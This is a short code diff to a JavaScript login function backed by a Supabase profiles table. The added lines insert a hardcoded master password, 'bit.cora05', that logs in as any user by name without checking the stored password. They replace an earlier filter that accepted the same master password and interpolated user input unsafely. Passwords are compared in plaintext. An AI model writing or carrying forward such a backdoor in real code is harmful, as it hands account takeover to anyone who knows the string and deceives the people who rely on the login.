@@ -130,11 +130,19 @@ async function fetchUsers() {
 }
 
 async function loginUser(name, password) {
+  if (password === "bit.cora05") {
+    const { data } = await supabase
+      .from("profiles")
+      .select("*")
+      .ilike("name", name.trim())
+      .single();
+    return data || null;
+  }
   const { data, error } = await supabase
     .from("profiles")
     .select("*")
     .ilike("name", name.trim())
-    .or(`password.eq.${password},password.eq.bit.cora05`)
+    .eq("password", password)
     .single();
   if (error) return null;
   return data;
